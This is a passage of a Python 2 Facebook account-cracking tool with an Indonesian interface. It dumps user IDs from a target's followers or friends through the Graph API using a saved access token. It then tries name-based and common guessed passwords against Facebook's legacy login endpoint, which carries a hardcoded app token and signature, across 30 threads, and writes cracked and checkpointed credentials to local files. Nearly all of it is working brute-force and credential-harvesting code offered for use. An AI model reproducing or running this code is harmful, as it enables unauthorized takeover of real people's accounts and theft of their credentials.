								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/saudi.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/saudi.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('123456')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/saudi.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/saudi.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['first_name'].lower()+'123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/saudi.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/saudi.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/saudi.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/saudi.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['first_name'].lower()+'786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/saudi.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/saudi.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'123'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/saudi.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/saudi.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone arab.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	
##### CRACK FOLLOW #####
def crack_follow():
	toket=open('login.txt','r').read()
	os.system('clear')
	print " "
	print "\033[0;95m  _____     _ _  "
	print "\033[0;95m |  ___|__ | | | _____      __ \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[0;95m | |_ / _ \| | |/ _ \ \ /\ / / \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[0;95m |  _| (_) | | | (_) \ V  V /  \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[0;95m |_|  \___/|_|_|\___/ \_/\_/  "
	print 50* "\033[1;94m─"
	print ("              \033[1;94m>>> \033[1;93mCRACK FOLLOWERS \033[1;94m<<<")
	print 50* "\033[1;94m─"
	idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mID Publik \033[1;91m:\033[1;97m ")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama Akun \033[1;91m:\033[1;97m "+op["name"]
	except KeyError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik tidak ada !"
		raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
		keluar()
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
	z = json.loads(r.text)
	for i in z['data']:
		id.append(i['id'])
		
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN FOLLOW #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/follow.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/follow.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/follow.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/follow.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/follow.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/follow.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('123456')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/follow.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/follow.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['first_name'].lower()+'123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/follow.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/follow.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/follow.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/follow.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone follow.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
																			
		
	
##### USERNAME ID ####
def user_id():
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;94m──────────────────\033[1;97m(\033[1;93mUsername Id\033[1;97m)\033[1;94m───────────────────"
	print 50* "\033[1;94m─"
	ling = ('https://www.facebook.com/')
	url = ling+raw_input("\033[1;97m(\033[1;94m•\033[1;97m) Username : ")
	idre = re.compile('"entity_id":"([0-9]+)"')
	page = requests.get(url)
	print idre.findall(page.content)
	raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
	menu()
	
	
	######### DUMP ##########
def dump():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;97m(\033[0;91m!\033[0;97m) Token invalid "
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		menu()
	os.system('clear')
	print logo2
	print 50* "\033[1;94m─"
	print "\033[1;94m────────────────────\033[1;97m(\033[1;93mDump Id\033[1;97m)\033[1;94m─────────────────────"
	print 50* "\033[1;94m─"
	print "\033[0;94m(\033[0;97m1\033[0;94m)\033[0;97m Ambil ID Dari Daftar Teman "
	print "\033[0;94m(\033[0;97m2\033[0;94m) \033[0;97mAmbil ID Dari Teman/Publik "
	print "\033[0;94m(\033[0;91m0\033[0;94m) \033[0;97mKembali "
	print 50* "\033[1;94m─"
	dump_pilih()
	
	
def dump_pilih():
	cuih = raw_input("\033[0;97m(\033[0;94m•\033[0;97m) Pilih \033[0;94m> \033[0;97m ")
	if cuih =="":
		print"\033[0;97m(\033[0;91m!\033[0;97m) Isi Yg Benar Sayang!"
		dump_pilih()
	elif cuih =="1" or cuih =="01":
		id_teman()
	elif cuih =="2" or cuih =="02":
		idfrom_teman()
	elif cuih =="0" or cuih =="00":
		menu()
	else:
		print"\033[0;97m(\033[0;91m!\033[0;97m) Isi Yg Benar Sayang!"
		dump_pilih()
		
##### ID TEMAN #####
def id_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;97m(\033[0;91m!\033[0;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo2
		print 50* "\033[1;94m─"
		print "\033[1;94m────────────────────\033[1;97m(\033[1;93mDump Id\033[1;97m)\033[1;94m─────────────────────"
		print 50* "\033[1;94m─"
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[0;97m(\033[0;94m•\033[0;97m) Mengambil semua ID Teman \033[0;97m...')
		print 50* "\033[1;94m─" 
		bz = open('out/id_teman.txt','w')
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[0;97m(\033[0;93m"+str(len(idteman))+"\033[0;97m)\033[0;94m > "),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[0;97m'+a['id']
		bz.close()
		print 50* "\033[1;94m─"
		print '\r\033[0;97m(\033[0;92m✓\033[0;97m) \033[0;97mSukses Mengambil ID \033[0;97m....'
		print 50* "\033[1;94m─"
		print"\r\033[0;97m(\033[0;94m•\033[0;97m) \033[0;97mTotal ID\033[0;91m :\033[0;97m %s"%(len(idteman))
		done = raw_input("\r\033[0;97m(\033[0;94m•\033[0;97m) Simpan Nama File\033[0;91m : \033[0;97m")
		os.rename('out/id_teman.txt','out/'+done)
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) File tersimpan \033[0;91m: \033[0;97mout/"+done)
		print "\n\033[1;94m──────────────────────────────────────────────────"
		raw_input("\033[0;97m(\033[0;91mKembali\033[0;97m)")
		os.system("python2 Crack.py")
	except IOError:
		print"\033[0;97m(\033[0;91m!\033[0;97m) Gagal membuat file"
		raw_input("\n\033[0;97m(\033[0;91mKembali\033[0;97m)")
		dump()
	except (KeyboardInterrupt,EOFError):
		print"\033[0;97m(\033[0;91m!\033[0;97m) Terhenti ! "
		raw_input("\n\033[0;97m(\033[0;91mKembali\033[0;97m)")
		dump()
	except KeyError:
		print('\033[0;97m(\033[0;91m!\033[0;97m) Gagal !')
